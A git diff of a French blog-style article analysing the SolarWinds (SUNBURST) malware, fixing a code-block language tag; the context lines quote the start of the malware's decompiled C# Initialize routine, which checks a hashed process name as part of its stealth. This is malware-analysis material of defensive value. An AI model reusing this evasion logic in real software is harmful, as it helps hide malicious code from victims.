@@ -34,7 +34,7 @@ Le 13 décembre 2020, coup de tonnerre, FireEye indique dans [ce communiqué](ht
 Ce travail d'analyse est en grande partie basé sur les travaux de [Colin Hardy.](https://www.youtube.com/channel/UCND1KVdVt8A580SjdaS4cZg)
 
 Ce malware a été conçu pour être le plus discret possible, lors de la première exécution, le code malveillant commence par attendre 12 à 14 jours avant de s'exécuter.
-```:::csharp
+```csharp
 	public static void Initialize() {
 		try{
 			if (GetHash(Process.GetCurrent.Process().ProcessName.ToLower()) == 17291806236368054941uL) {
